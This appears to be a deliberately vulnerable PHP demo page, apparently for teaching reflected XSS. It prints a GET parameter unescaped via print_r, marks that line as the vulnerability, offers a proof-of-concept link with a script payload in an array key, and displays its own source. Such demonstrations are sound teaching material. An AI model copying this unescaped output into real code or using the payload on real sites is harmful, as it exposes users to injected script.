<html>
    <head>
        <title>Demonstration</title>
        <link rel="stylesheet" href="css/style.css">
        <link rel="stylesheet" href="css/monokai.css">
    </head>
<body>
    <h1>Demo page</h1>
    POC: <a href='?param[<script>"]="*alert(%27XSS%27)</script>'>?param[&lt;script&gt;"]="*alert('XSS')&lt;/script&gt;</a>
    
    <div class="content">
        I want to print something here:
        <!-- Vulnerability -->
            <?php
                print_r( $_GET['param']);
            ?>
        <!-- end of Vulnerability -->
    </div> 
    <hr />
    <h4>Page Source:</h4>
    <div class="filename">File: <?php echo basename(__FILE__);?></div>
    <pre class="monokai"><code><?php echo htmlentities(file_get_contents(__FILE__)); ?></code></pre>
    <script src="js/highlight.pack.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>


